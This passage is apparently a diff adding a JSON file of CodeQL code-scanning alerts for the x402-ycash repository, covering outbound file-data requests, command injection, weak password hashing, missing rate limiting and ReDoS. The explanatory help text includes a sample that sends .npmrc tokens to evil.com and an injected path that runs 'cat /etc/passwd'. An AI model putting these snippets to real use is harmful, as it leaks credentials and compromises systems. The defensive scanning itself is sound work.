@@ -1,0 +1,2715 @@
+[
+ {
+  "number": 50,
+  "created_at": "2026-10-23T06:19:31Z",
+  "updated_at": "2026-10-23T06:19:31Z",
+  "url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/50",
+  "html_url": "https://github.com/boyfromcave/x402-ycash/security/code-scanning/50",
+  "state": "open",
+  "fixed_at": null,
+  "dismissed_by": null,
+  "dismissed_at": null,
+  "dismissed_reason": null,
+  "dismissed_comment": null,
+  "rule": {
+   "id": "js/file-access-to-http",
+   "severity": "warning",
+   "description": "File data in outbound network request",
+   "name": "js/file-access-to-http",
+   "tags": [
+    "external/cwe/cwe-200",
+    "security"
+   ],
+   "full_description": "Directly sending file data in an outbound network request can indicate unauthorized information disclosure.",
+   "help": "# File data in outbound network request\nSending local file system data to a remote URL without further validation risks uncontrolled information exposure, and may be an indication of malicious backdoor code that has been implanted into an otherwise trusted code base.\n\n\n## Recommendation\nExamine the highlighted code closely to ensure that it is behaving as intended.\n\n\n## Example\nThe following example is adapted from backdoor code that was identified in two popular npm packages. It reads the contents of the `.npmrc` file (which may contain secret npm tokens) and sends it to a remote server by embedding it into an HTTP request header.\n\n\n```javascript\nvar fs = require(\"fs\"),\n    https = require(\"https\");\n\nvar content = fs.readFileSync(\".npmrc\", \"utf8\");\nhttps.get({\n  hostname: \"evil.com\",\n  path: \"/upload\",\n  method: \"GET\",\n  headers: { Referer: content }\n}, () => { });\n\n```\n\n## References\n* ESLint Blog: [Postmortem for Malicious Packages Published on July 12th, 2018](https://eslint.org/blog/2018/07/postmortem-for-malicious-package-publishes).\n* OWASP: [Sensitive Data Exposure](https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure).\n* OWASP: [Trojan Horse](https://www.owasp.org/index.php/Trojan_Horse).\n* Common Weakness Enumeration: [CWE-200](https://cwe.mitre.org/data/definitions/200.html).\n",
+   "security_severity_level": "medium"
+  },
+  "tool": {
+   "name": "CodeQL",
+   "guid": null,
+   "version": "2.27.3"
+  },
+  "most_recent_instance": {
+   "ref": "refs/heads/upgrade/vault",
+   "analysis_key": ".github/workflows/codeql.yml:analyze",
+   "environment": "{\"language\":\"javascript-typescript\"}",
+   "category": "codeql-javascript-typescript",
+   "state": "open",
+   "commit_sha": "5b76da203bcb087429abc9c3c1a46ae5be7cf9c7",
+   "message": {
+    "text": "Outbound network request depends on file data.\nOutbound network request depends on file data."
+   },
+   "location": {
+    "path": "tools/mainnet/smoke-lib.mjs",
+    "start_line": 45,
+    "end_line": 45,
+    "start_column": 14,
+    "end_column": 84
+   },
+   "classifications": []
+  },
+  "instances_url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/50/instances",
+  "dismissal_approved_by": null,
+  "assignees": [],
+  "linked_pull_requests": [],
+  "linked_issues": []
+ },
+ {
+  "number": 49,
+  "created_at": "2026-10-23T06:19:31Z",
+  "updated_at": "2026-10-23T06:19:31Z",
+  "url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/49",
+  "html_url": "https://github.com/boyfromcave/x402-ycash/security/code-scanning/49",
+  "state": "open",
+  "fixed_at": null,
+  "dismissed_by": null,
+  "dismissed_at": null,
+  "dismissed_reason": null,
+  "dismissed_comment": null,
+  "rule": {
+   "id": "js/file-access-to-http",
+   "severity": "warning",
+   "description": "File data in outbound network request",
+   "name": "js/file-access-to-http",
+   "tags": [
+    "external/cwe/cwe-200",
+    "security"
+   ],
+   "full_description": "Directly sending file data in an outbound network request can indicate unauthorized information disclosure.",
+   "help": "# File data in outbound network request\nSending local file system data to a remote URL without further validation risks uncontrolled information exposure, and may be an indication of malicious backdoor code that has been implanted into an otherwise trusted code base.\n\n\n## Recommendation\nExamine the highlighted code closely to ensure that it is behaving as intended.\n\n\n## Example\nThe following example is adapted from backdoor code that was identified in two popular npm packages. It reads the contents of the `.npmrc` file (which may contain secret npm tokens) and sends it to a remote server by embedding it into an HTTP request header.\n\n\n```javascript\nvar fs = require(\"fs\"),\n    https = require(\"https\");\n\nvar content = fs.readFileSync(\".npmrc\", \"utf8\");\nhttps.get({\n  hostname: \"evil.com\",\n  path: \"/upload\",\n  method: \"GET\",\n  headers: { Referer: content }\n}, () => { });\n\n```\n\n## References\n* ESLint Blog: [Postmortem for Malicious Packages Published on July 12th, 2018](https://eslint.org/blog/2018/07/postmortem-for-malicious-package-publishes).\n* OWASP: [Sensitive Data Exposure](https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure).\n* OWASP: [Trojan Horse](https://www.owasp.org/index.php/Trojan_Horse).\n* Common Weakness Enumeration: [CWE-200](https://cwe.mitre.org/data/definitions/200.html).\n",
+   "security_severity_level": "medium"
+  },
+  "tool": {
+   "name": "CodeQL",
+   "guid": null,
+   "version": "2.27.3"
+  },
+  "most_recent_instance": {
+   "ref": "refs/heads/upgrade/vault",
+   "analysis_key": ".github/workflows/codeql.yml:analyze",
+   "environment": "{\"language\":\"javascript-typescript\"}",
+   "category": "codeql-javascript-typescript",
+   "state": "open",
+   "commit_sha": "5b76da203bcb087429abc9c3c1a46ae5be7cf9c7",
+   "message": {
+    "text": "Outbound network request depends on file data.\nOutbound network request depends on file data."
+   },
+   "location": {
+    "path": "packages/ycash/src/node/transport.ts",
+    "start_line": 123,
+    "end_line": 123,
+    "start_column": 15,
+    "end_column": 84
+   },
+   "classifications": []
+  },
+  "instances_url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/49/instances",
+  "dismissal_approved_by": null,
+  "assignees": [],
+  "linked_pull_requests": [],
+  "linked_issues": []
+ },
+ {
+  "number": 48,
+  "created_at": "2026-10-23T06:19:31Z",
+  "updated_at": "2026-10-23T06:19:31Z",
+  "url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/48",
+  "html_url": "https://github.com/boyfromcave/x402-ycash/security/code-scanning/48",
+  "state": "open",
+  "fixed_at": null,
+  "dismissed_by": null,
+  "dismissed_at": null,
+  "dismissed_reason": null,
+  "dismissed_comment": null,
+  "rule": {
+   "id": "js/file-access-to-http",
+   "severity": "warning",
+   "description": "File data in outbound network request",
+   "name": "js/file-access-to-http",
+   "tags": [
+    "external/cwe/cwe-200",
+    "security"
+   ],
+   "full_description": "Directly sending file data in an outbound network request can indicate unauthorized information disclosure.",
+   "help": "# File data in outbound network request\nSending local file system data to a remote URL without further validation risks uncontrolled information exposure, and may be an indication of malicious backdoor code that has been implanted into an otherwise trusted code base.\n\n\n## Recommendation\nExamine the highlighted code closely to ensure that it is behaving as intended.\n\n\n## Example\nThe following example is adapted from backdoor code that was identified in two popular npm packages. It reads the contents of the `.npmrc` file (which may contain secret npm tokens) and sends it to a remote server by embedding it into an HTTP request header.\n\n\n```javascript\nvar fs = require(\"fs\"),\n    https = require(\"https\");\n\nvar content = fs.readFileSync(\".npmrc\", \"utf8\");\nhttps.get({\n  hostname: \"evil.com\",\n  path: \"/upload\",\n  method: \"GET\",\n  headers: { Referer: content }\n}, () => { });\n\n```\n\n## References\n* ESLint Blog: [Postmortem for Malicious Packages Published on July 12th, 2018](https://eslint.org/blog/2018/07/postmortem-for-malicious-package-publishes).\n* OWASP: [Sensitive Data Exposure](https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure).\n* OWASP: [Trojan Horse](https://www.owasp.org/index.php/Trojan_Horse).\n* Common Weakness Enumeration: [CWE-200](https://cwe.mitre.org/data/definitions/200.html).\n",
+   "security_severity_level": "medium"
+  },
+  "tool": {
+   "name": "CodeQL",
+   "guid": null,
+   "version": "2.27.3"
+  },
+  "most_recent_instance": {
+   "ref": "refs/heads/upgrade/vault",
+   "analysis_key": ".github/workflows/codeql.yml:analyze",
+   "environment": "{\"language\":\"javascript-typescript\"}",
+   "category": "codeql-javascript-typescript",
+   "state": "open",
+   "commit_sha": "5b76da203bcb087429abc9c3c1a46ae5be7cf9c7",
+   "message": {
+    "text": "Outbound network request depends on file data.\nOutbound network request depends on file data."
+   },
+   "location": {
+    "path": "packages/ycash/src/node/transport.ts",
+    "start_line": 122,
+    "end_line": 122,
+    "start_column": 18,
+    "end_column": 99
+   },
+   "classifications": []
+  },
+  "instances_url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/48/instances",
+  "dismissal_approved_by": null,
+  "assignees": [],
+  "linked_pull_requests": [],
+  "linked_issues": []
+ },
+ {
+  "number": 47,
+  "created_at": "2026-10-23T06:19:31Z",
+  "updated_at": "2026-10-23T06:19:31Z",
+  "url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/47",
+  "html_url": "https://github.com/boyfromcave/x402-ycash/security/code-scanning/47",
+  "state": "open",
+  "fixed_at": null,
+  "dismissed_by": null,
+  "dismissed_at": null,
+  "dismissed_reason": null,
+  "dismissed_comment": null,
+  "rule": {
+   "id": "js/file-system-race",
+   "severity": "warning",
+   "description": "Potential file system race condition",
+   "name": "js/file-system-race",
+   "tags": [
+    "external/cwe/cwe-367",
+    "security"
+   ],
+   "full_description": "Separately checking the state of a file before operating on it may allow an attacker to modify the file between the two operations.",
+   "help": "# Potential file system race condition\nOften it is necessary to check the state of a file before using it. These checks usually take a file name to be checked, and if the check returns positively, then the file is opened or otherwise operated upon.\n\nHowever, in the time between the check and the operation, the underlying file referenced by the file name could be changed by an attacker, causing unexpected behavior.\n\n\n## Recommendation\nUse file descriptors instead of file names whenever possible.\n\n\n## Example\nThe following example shows a case where the code checks whether a file inside the `/tmp/` folder exists, and if it doesn't, the file is written to that location.\n\n\n```javascript\nconst fs = require(\"fs\");\nconst os = require(\"os\");\nconst path = require(\"path\");\n\nconst filePath = path.join(os.tmpdir(), \"my-temp-file.txt\");\n\nif (!fs.existsSync(filePath)) {\n  fs.writeFileSync(filePath, \"Hello\", { mode: 0o600 });\n}\n\n```\nHowever, in a multi-user environment the file might be created by another user between the existence check and the write.\n\nThis can be avoided by using `fs.open` to get a file descriptor, and then use that file descriptor in the write operation.\n\n\n```javascript\nconst fs = require(\"fs\");\nconst os = require(\"os\");\nconst path = require(\"path\");\n\nconst filePath = path.join(os.tmpdir(), \"my-temp-file.txt\");\n\ntry {\n  const fd = fs.openSync(filePath, fs.O_CREAT | fs.O_EXCL | fs.O_RDWR, 0o600);\n\n  fs.writeFileSync(fd, \"Hello\");\n} catch (e) {\n  // file existed\n}\n\n```\n\n## References\n* Wikipedia: [Time-of-check to time-of-use](https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use).\n* The CERT Oracle Secure Coding Standard for C: [ FIO01-C. Be careful using functions that use file names for identification ](https://www.securecoding.cert.org/confluence/display/c/FIO01-C.+Be+careful+using+functions+that+use+file+names+for+identification).\n* NodeJS: [The FS module](https://nodejs.org/api/fs.html).\n* Common Weakness Enumeration: [CWE-367](https://cwe.mitre.org/data/definitions/367.html).\n",
+   "security_severity_level": "high"
+  },
+  "tool": {
+   "name": "CodeQL",
+   "guid": null,
+   "version": "2.27.3"
+  },
+  "most_recent_instance": {
+   "ref": "refs/heads/upgrade/vault",
+   "analysis_key": ".github/workflows/codeql.yml:analyze",
+   "environment": "{\"language\":\"javascript-typescript\"}",
+   "category": "codeql-javascript-typescript",
+   "state": "open",
+   "commit_sha": "5b76da203bcb087429abc9c3c1a46ae5be7cf9c7",
+   "message": {
+    "text": "The file may have changed since it was checked."
+   },
+   "location": {
+    "path": "packages/ycash/src/store/jsonFile.ts",
+    "start_line": 140,
+    "end_line": 140,
+    "start_column": 20,
+    "end_column": 51
+   },
+   "classifications": []
+  },
+  "instances_url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/47/instances",
+  "dismissal_approved_by": null,
+  "assignees": [],
+  "linked_pull_requests": [],
+  "linked_issues": []
+ },
+ {
+  "number": 46,
+  "created_at": "2026-10-23T06:19:31Z",
+  "updated_at": "2026-10-23T06:19:31Z",
+  "url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/46",
+  "html_url": "https://github.com/boyfromcave/x402-ycash/security/code-scanning/46",
+  "state": "open",
+  "fixed_at": null,
+  "dismissed_by": null,
+  "dismissed_at": null,
+  "dismissed_reason": null,
+  "dismissed_comment": null,
+  "rule": {
+   "id": "js/shell-command-injection-from-environment",
+   "severity": "warning",
+   "description": "Shell command built from environment values",
+   "name": "js/shell-command-injection-from-environment",
+   "tags": [
+    "correctness",
+    "external/cwe/cwe-078",
+    "external/cwe/cwe-088",
+    "security"
+   ],
+   "full_description": "Building a shell command string with values from the enclosing environment may cause subtle bugs or vulnerabilities.",
+   "help": "# Shell command built from environment values\nDynamically constructing a shell command with values from the local environment, such as file paths, may inadvertently change the meaning of the shell command. Such changes can occur when an environment value contains characters that the shell interprets in a special way, for instance quotes and spaces. This can result in the shell command misbehaving, or even allowing a malicious user to execute arbitrary commands on the system.\n\n\n## Recommendation\nIf possible, use hard-coded string literals to specify the shell command to run, and provide the dynamic arguments to the shell command separately to avoid interpretation by the shell.\n\nAlternatively, if the shell command must be constructed dynamically, then add code to ensure that special characters in environment values do not alter the shell command unexpectedly.\n\n\n## Example\nThe following example shows a dynamically constructed shell command that recursively removes a temporary directory that is located next to the currently executing JavaScript file. Such utilities are often found in custom build scripts.\n\n\n```javascript\nvar cp = require(\"child_process\"),\n  path = require(\"path\");\nfunction cleanupTemp() {\n  let cmd = \"rm -rf \" + path.join(__dirname, \"temp\");\n  cp.execSync(cmd); // BAD\n}\n\n```\nThe shell command will, however, fail to work as intended if the absolute path of the script's directory contains spaces. In that case, the shell command will interpret the absolute path as multiple paths, instead of a single path.\n\nFor instance, if the absolute path of the temporary directory is `/home/username/important project/temp`, then the shell command will recursively delete `/home/username/important` and `project/temp`, where the latter path gets resolved relative to the working directory of the JavaScript process.\n\nEven worse, although less likely, a malicious user could provide the path `/home/username/; cat /etc/passwd #/important project/temp` in order to execute the command `cat /etc/passwd`.\n\nTo avoid such potentially catastrophic behaviors, provide the directory as an argument that does not get interpreted by a shell:\n\n\n```javascript\nvar cp = require(\"child_process\"),\n  path = require(\"path\");\nfunction cleanupTemp() {\n  let cmd = \"rm\",\n    args = [\"-rf\", path.join(__dirname, \"temp\")];\n  cp.execFileSync(cmd, args); // GOOD\n}\n\n```\n\n## References\n* OWASP: [Command Injection](https://www.owasp.org/index.php/Command_Injection).\n* Common Weakness Enumeration: [CWE-78](https://cwe.mitre.org/data/definitions/78.html).\n* Common Weakness Enumeration: [CWE-88](https://cwe.mitre.org/data/definitions/88.html).\n",
+   "security_severity_level": "medium"
+  },
+  "tool": {
+   "name": "CodeQL",
+   "guid": null,
+   "version": "2.27.3"
+  },
+  "most_recent_instance": {
+   "ref": "refs/heads/upgrade/vault",
+   "analysis_key": ".github/workflows/codeql.yml:analyze",
+   "environment": "{\"language\":\"javascript-typescript\"}",
+   "category": "codeql-javascript-typescript",
+   "state": "open",
+   "commit_sha": "5b76da203bcb087429abc9c3c1a46ae5be7cf9c7",
+   "message": {
+    "text": "This shell command depends on an uncontrolled absolute path."
+   },
+   "location": {
+    "path": "packages/ycash/src/shielded/builder.ts",
+    "start_line": 124,
+    "end_line": 124,
+    "start_column": 21,
+    "end_column": 142
+   },
+   "classifications": []
+  },
+  "instances_url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/46/instances",
+  "dismissal_approved_by": null,
+  "assignees": [],
+  "linked_pull_requests": [],
+  "linked_issues": []
+ },
+ {
+  "number": 45,
+  "created_at": "2026-10-23T06:19:31Z",
+  "updated_at": "2026-10-23T06:19:31Z",
+  "url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/45",
+  "html_url": "https://github.com/boyfromcave/x402-ycash/security/code-scanning/45",
+  "state": "open",
+  "fixed_at": null,
+  "dismissed_by": null,
+  "dismissed_at": null,
+  "dismissed_reason": null,
+  "dismissed_comment": null,
+  "rule": {
+   "id": "js/insufficient-password-hash",
+   "severity": "warning",
+   "description": "Use of password hash with insufficient computational effort",
+   "name": "js/insufficient-password-hash",
+   "tags": [
+    "external/cwe/cwe-916",
+    "security"
+   ],
+   "full_description": "Creating a hash of a password with low computational effort makes the hash vulnerable to password cracking attacks.",
+   "help": "# Use of password hash with insufficient computational effort\nStoring cryptographic hashes of passwords is standard security practice, but it is equally important to select the right hashing scheme. If an attacker obtains the hashed passwords of an application, the password hashing scheme should still prevent the attacker from easily obtaining the original cleartext passwords.\n\nA good password hashing scheme requires a computation that cannot be done efficiently. Standard hashing schemes, such as `md5` or `sha1`, are efficiently computable, and are therefore not suitable for password hashing.\n\n\n## Recommendation\nUse a secure password hashing scheme such as `bcrypt`, `scrypt`, `PBKDF2`, or `Argon2`.\n\n\n## Example\nIn the example below, the `md5` algorithm computes the hash of a password.\n\n\n```javascript\nconst crypto = require(\"crypto\");\nfunction hashPassword(password) {\n    var hasher = crypto.createHash('md5');\n    var hashed = hasher.update(password).digest(\"hex\"); // BAD\n    return hashed;\n}\n\n```\nThis is not secure, since the password can be efficiently cracked by an attacker that obtains the hash. A more secure scheme is to hash the password with the `bcrypt` algorithm:\n\n\n```javascript\nconst bcrypt = require(\"bcrypt\");\nfunction hashPassword(password, salt) {\n  var hashed = bcrypt.hashSync(password, salt); // GOOD\n  return hashed;\n}\n\n```\n\n## References\n* OWASP: [Password storage](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html).\n* Common Weakness Enumeration: [CWE-916](https://cwe.mitre.org/data/definitions/916.html).\n",
+   "security_severity_level": "high"
+  },
+  "tool": {
+   "name": "CodeQL",
+   "guid": null,
+   "version": "2.27.3"
+  },
+  "most_recent_instance": {
+   "ref": "refs/heads/upgrade/vault",
+   "analysis_key": ".github/workflows/codeql.yml:analyze",
+   "environment": "{\"language\":\"javascript-typescript\"}",
+   "category": "codeql-javascript-typescript",
+   "state": "open",
+   "commit_sha": "5b76da203bcb087429abc9c3c1a46ae5be7cf9c7",
+   "message": {
+    "text": "Password from an access to apiKey is hashed insecurely."
+   },
+   "location": {
+    "path": "packages/facilitator/src/app.ts",
+    "start_line": 61,
+    "end_line": 61,
+    "start_column": 38,
+    "end_column": 39
+   },
+   "classifications": []
+  },
+  "instances_url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/45/instances",
+  "dismissal_approved_by": null,
+  "assignees": [],
+  "linked_pull_requests": [],
+  "linked_issues": []
+ },
+ {
+  "number": 44,
+  "created_at": "2026-10-23T06:19:31Z",
+  "updated_at": "2026-10-23T06:19:31Z",
+  "url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/44",
+  "html_url": "https://github.com/boyfromcave/x402-ycash/security/code-scanning/44",
+  "state": "open",
+  "fixed_at": null,
+  "dismissed_by": null,
+  "dismissed_at": null,
+  "dismissed_reason": null,
+  "dismissed_comment": null,
+  "rule": {
+   "id": "js/missing-rate-limiting",
+   "severity": "warning",
+   "description": "Missing rate limiting",
+   "name": "js/missing-rate-limiting",
+   "tags": [
+    "external/cwe/cwe-307",
+    "external/cwe/cwe-400",
+    "external/cwe/cwe-770",
+    "security"
+   ],
+   "full_description": "An HTTP request handler that performs expensive operations without restricting the rate at which operations can be carried out is vulnerable to denial-of-service attacks.",
+   "help": "# Missing rate limiting\nHTTP request handlers should not perform expensive operations such as accessing the file system, executing an operating system command or interacting with a database without limiting the rate at which requests are accepted. Otherwise, the application becomes vulnerable to denial-of-service attacks where an attacker can cause the application to crash or become unresponsive by issuing a large number of requests at the same time.\n\n\n## Recommendation\nA rate-limiting middleware should be used to prevent such attacks.\n\n\n## Example\nThe following example shows an Express application that serves static files without rate limiting:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\napp.get('/:path', function(req, res) {\n  let path = req.params.path;\n  if (isValidPath(path))\n    res.sendFile(path);\n});\n\n```\nTo prevent denial-of-service attacks, the `express-rate-limit` package can be used:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\n// set up rate limiter: maximum of five requests per minute\nvar RateLimit = require('express-rate-limit');\nvar limiter = RateLimit({\n  windowMs: 15 * 60 * 1000, // 15 minutes\n  max: 100, // max 100 requests per windowMs\n});\n\n// apply rate limiter to all requests\napp.use(limiter);\n\napp.get('/:path', function(req, res) {\n  let path = req.params.path;\n  if (isValidPath(path))\n    res.sendFile(path);\n});\n\n```\n\n## References\n* OWASP: [Denial of Service Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html).\n* Wikipedia: [Denial-of-service attack](https://en.wikipedia.org/wiki/Denial-of-service_attack).\n* NPM: [express-rate-limit](https://www.npmjs.com/package/express-rate-limit).\n* Common Weakness Enumeration: [CWE-770](https://cwe.mitre.org/data/definitions/770.html).\n* Common Weakness Enumeration: [CWE-307](https://cwe.mitre.org/data/definitions/307.html).\n* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n",
+   "security_severity_level": "high"
+  },
+  "tool": {
+   "name": "CodeQL",
+   "guid": null,
+   "version": "2.27.3"
+  },
+  "most_recent_instance": {
+   "ref": "refs/heads/upgrade/vault",
+   "analysis_key": ".github/workflows/codeql.yml:analyze",
+   "environment": "{\"language\":\"javascript-typescript\"}",
+   "category": "codeql-javascript-typescript",
+   "state": "open",
+   "commit_sha": "5b76da203bcb087429abc9c3c1a46ae5be7cf9c7",
+   "message": {
+    "text": "This route handler performs authorization, but is not rate-limited."
+   },
+   "location": {
+    "path": "packages/facilitator/src/app.ts",
+    "start_line": 117,
+    "end_line": 136,
+    "start_column": 46,
+    "end_column": 4
+   },
+   "classifications": []
+  },
+  "instances_url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/44/instances",
+  "dismissal_approved_by": null,
+  "assignees": [],
+  "linked_pull_requests": [],
+  "linked_issues": []
+ },
+ {
+  "number": 43,
+  "created_at": "2026-10-23T06:19:31Z",
+  "updated_at": "2026-10-23T06:19:31Z",
+  "url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/43",
+  "html_url": "https://github.com/boyfromcave/x402-ycash/security/code-scanning/43",
+  "state": "open",
+  "fixed_at": null,
+  "dismissed_by": null,
+  "dismissed_at": null,
+  "dismissed_reason": null,
+  "dismissed_comment": null,
+  "rule": {
+   "id": "js/polynomial-redos",
+   "severity": "warning",
+   "description": "Polynomial regular expression used on uncontrolled data",
+   "name": "js/polynomial-redos",
+   "tags": [
+    "external/cwe/cwe-1333",
+    "external/cwe/cwe-400",
+    "external/cwe/cwe-730",
+    "security"
+   ],
+   "full_description": "A regular expression that can require polynomial time to match may be vulnerable to denial-of-service attacks.",
+   "help": "# Polynomial regular expression used on uncontrolled data\nSome regular expressions take a long time to match certain input strings to the point where the time it takes to match a string of length *n* is proportional to *n<sup>k</sup>* or even *2<sup>n</sup>*. Such regular expressions can negatively affect performance, or even allow a malicious user to perform a Denial of Service (\"DoS\") attack by crafting an expensive input string for the regular expression to match.\n\nThe regular expression engines provided by many popular JavaScript platforms use backtracking non-deterministic finite automata to implement regular expression matching. While this approach is space-efficient and allows supporting advanced features like capture groups, it is not time-efficient in general. The worst-case time complexity of such an automaton can be polynomial or even exponential, meaning that for strings of a certain shape, increasing the input length by ten characters may make the automaton about 1000 times slower.\n\nTypically, a regular expression is affected by this problem if it contains a repetition of the form `r*` or `r+` where the sub-expression `r` is ambiguous in the sense that it can match some string in multiple ways. More information about the precise circumstances can be found in the references.\n\n\n## Recommendation\nModify the regular expression to remove the ambiguity, or ensure that the strings matched with the regular expression are short enough that the time-complexity does not matter.\n\n\n## Example\nConsider this use of a regular expression, which removes all leading and trailing whitespace in a string:\n\n```javascript\n\ntext.replace(/^\\s+|\\s+$/g, ''); // BAD\n```\nThe sub-expression `\"\\s+$\"` will match the whitespace characters in `text` from left to right, but it can start matching anywhere within a whitespace sequence. This is problematic for strings that do **not** end with a whitespace character. Such a string will force the regular expression engine to process each whitespace sequence once per whitespace character in the sequence.\n\nThis ultimately means that the time cost of trimming a string is quadratic in the length of the string. So a string like `\"a b\"` will take milliseconds to process, but a similar string with a million spaces instead of just one will take several minutes.\n\nAvoid this problem by rewriting the regular expression to not contain the ambiguity about when to start matching whitespace sequences. For instance, by using a negative look-behind (`/^\\s+|(?<!\\s)\\s+$/g`), or just by using the built-in trim method (`text.trim()`).\n\nNote that the sub-expression `\"^\\s+\"` is **not** problematic as the `^` anchor restricts when that sub-expression can start matching, and as the regular expression engine matches from left to right.\n\n\n## Example\nAs a similar, but slightly subtler problem, consider the regular expression that matches lines with numbers, possibly written using scientific notation:\n\n```javascript\n\n/^0\\.\\d+E?\\d+$/.test(str) // BAD\n```\nThe problem with this regular expression is in the sub-expression `\\d+E?\\d+` because the second `\\d+` can start matching digits anywhere after the first match of the first `\\d+` if there is no `E` in the input string.\n\nThis is problematic for strings that do **not** end with a digit. Such a string will force the regular expression engine to process each digit sequence once per digit in the sequence, again leading to a quadratic time complexity.\n\nTo make the processing faster, the regular expression should be rewritten such that the two `\\d+` sub-expressions do not have overlapping matches: `^0\\.\\d+(E\\d+)?$`.\n\n\n## Example\nSometimes it is unclear how a regular expression can be rewritten to avoid the problem. In such cases, it often suffices to limit the length of the input string. For instance, the following regular expression is used to match numbers, and on some non-number inputs it can have quadratic time complexity:\n\n```javascript\n\n/^(\\+|-)?(\\d+|(\\d*\\.\\d*))?(E|e)?([-+])?(\\d+)?$/.test(str) // BAD\n```\nIt is not immediately obvious how to rewrite this regular expression to avoid the problem. However, you can mitigate performance issues by limiting the length to 1000 characters, which will always finish in a reasonable amount of time.\n\n```javascript\n\nif (str.length > 1000) {\n    throw new Error(\"Input too long\");\n}\n\n/^(\\+|-)?(\\d+|(\\d*\\.\\d*))?(E|e)?([-+])?(\\d+)?$/.test(str)\n```\n\n## References\n* OWASP: [Regular expression Denial of Service - ReDoS](https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS).\n* Wikipedia: [ReDoS](https://en.wikipedia.org/wiki/ReDoS).\n* Wikipedia: [Time complexity](https://en.wikipedia.org/wiki/Time_complexity).\n* James Kirrage, Asiri Rathnayake, Hayo Thielecke: [Static Analysis for Regular Expression Denial-of-Service Attack](https://arxiv.org/abs/1301.0849).\n* Common Weakness Enumeration: [CWE-1333](https://cwe.mitre.org/data/definitions/1333.html).\n* Common Weakness Enumeration: [CWE-730](https://cwe.mitre.org/data/definitions/730.html).\n* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n",
+   "security_severity_level": "high"
+  },
+  "tool": {
+   "name": "CodeQL",
+   "guid": null,
+   "version": "2.27.3"
+  },
+  "most_recent_instance": {
+   "ref": "refs/heads/upgrade/vault",
+   "analysis_key": ".github/workflows/codeql.yml:analyze",
+   "environment": "{\"language\":\"javascript-typescript\"}",
+   "category": "codeql-javascript-typescript",
+   "state": "open",
+   "commit_sha": "5b76da203bcb087429abc9c3c1a46ae5be7cf9c7",
+   "message": {
+    "text": "This regular expression that depends on library input may run slow on strings with many repetitions of ' '."
+   },
+   "location": {
+    "path": "packages/ycash/src/batch/server/scheme.ts",
+    "start_line": 199,
+    "end_line": 199,
+    "start_column": 31,
+    "end_column": 56
+   },
+   "classifications": []
+  },
+  "instances_url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/43/instances",
+  "dismissal_approved_by": null,
+  "assignees": [],
+  "linked_pull_requests": [],
+  "linked_issues": []
+ },
+ {
+  "number": 42,
+  "created_at": "2026-10-23T06:19:31Z",
+  "updated_at": "2026-10-23T06:19:31Z",
+  "url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/42",
+  "html_url": "https://github.com/boyfromcave/x402-ycash/security/code-scanning/42",
+  "state": "open",
+  "fixed_at": null,
+  "dismissed_by": null,
+  "dismissed_at": null,
+  "dismissed_reason": null,
+  "dismissed_comment": null,
+  "rule": {
+   "id": "js/polynomial-redos",
+   "severity": "warning",
+   "description": "Polynomial regular expression used on uncontrolled data",
+   "name": "js/polynomial-redos",
+   "tags": [
+    "external/cwe/cwe-1333",
+    "external/cwe/cwe-400",
+    "external/cwe/cwe-730",
+    "security"
+   ],
+   "full_description": "A regular expression that can require polynomial time to match may be vulnerable to denial-of-service attacks.",
+   "help": "# Polynomial regular expression used on uncontrolled data\nSome regular expressions take a long time to match certain input strings to the point where the time it takes to match a string of length *n* is proportional to *n<sup>k</sup>* or even *2<sup>n</sup>*. Such regular expressions can negatively affect performance, or even allow a malicious user to perform a Denial of Service (\"DoS\") attack by crafting an expensive input string for the regular expression to match.\n\nThe regular expression engines provided by many popular JavaScript platforms use backtracking non-deterministic finite automata to implement regular expression matching. While this approach is space-efficient and allows supporting advanced features like capture groups, it is not time-efficient in general. The worst-case time complexity of such an automaton can be polynomial or even exponential, meaning that for strings of a certain shape, increasing the input length by ten characters may make the automaton about 1000 times slower.\n\nTypically, a regular expression is affected by this problem if it contains a repetition of the form `r*` or `r+` where the sub-expression `r` is ambiguous in the sense that it can match some string in multiple ways. More information about the precise circumstances can be found in the references.\n\n\n## Recommendation\nModify the regular expression to remove the ambiguity, or ensure that the strings matched with the regular expression are short enough that the time-complexity does not matter.\n\n\n## Example\nConsider this use of a regular expression, which removes all leading and trailing whitespace in a string:\n\n```javascript\n\ntext.replace(/^\\s+|\\s+$/g, ''); // BAD\n```\nThe sub-expression `\"\\s+$\"` will match the whitespace characters in `text` from left to right, but it can start matching anywhere within a whitespace sequence. This is problematic for strings that do **not** end with a whitespace character. Such a string will force the regular expression engine to process each whitespace sequence once per whitespace character in the sequence.\n\nThis ultimately means that the time cost of trimming a string is quadratic in the length of the string. So a string like `\"a b\"` will take milliseconds to process, but a similar string with a million spaces instead of just one will take several minutes.\n\nAvoid this problem by rewriting the regular expression to not contain 